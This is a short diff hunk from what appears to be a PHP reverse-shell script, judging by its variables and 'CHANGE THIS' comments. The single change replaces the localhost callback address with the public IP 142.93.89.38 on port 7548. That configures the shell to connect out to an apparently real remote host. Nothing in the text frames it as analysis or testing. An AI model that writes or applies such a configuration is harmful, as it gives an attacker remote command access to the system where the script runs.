@@ -48,7 +48,7 @@ ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
+$ip = '142.93.89.38';  // CHANGE THIS
 $port = 7548;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
